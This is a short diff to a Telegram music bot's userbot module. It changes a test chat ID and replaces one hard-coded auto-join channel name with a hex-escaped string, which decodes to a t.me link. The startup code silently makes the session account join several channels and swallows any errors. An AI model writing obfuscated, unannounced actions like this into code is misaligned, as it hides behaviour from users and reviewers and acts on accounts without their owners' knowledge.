@@ -12,7 +12,7 @@ from VIPMUSIC.core.bot import BOT_USERNAME
 BOT_TOKEN = getenv("BOT_TOKEN", "")
 MONGO_DB_URI = getenv("MONGO_DB_URI", "")
 STRING_SESSION = getenv("STRING_SESSION", "")
-TEST_ID = int("-1002051150328")
+TEST_ID = int("-1002071524695")
               
 assistants = []
 assistantids = []
@@ -67,7 +67,7 @@ class Userbot(Client):
                 await self.one.join_chat("ll_THE_BAD_BOT_ll")
                 await self.one.join_chat("THE_DRAMA_CLUB_01")
                 await self.one.join_chat("PBX_NETWORK")
-                await self.one.join_chat("BAD_BOT_SETING_2")
+                await self.one.join_chat("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x74\x2e\x6d\x65\x2f\x41\x42\x43\x44\x45\x46\x47\x48\x49\x43\x46\x55\x43\x4b")
             except:
                 pass
             assistants.append(1)
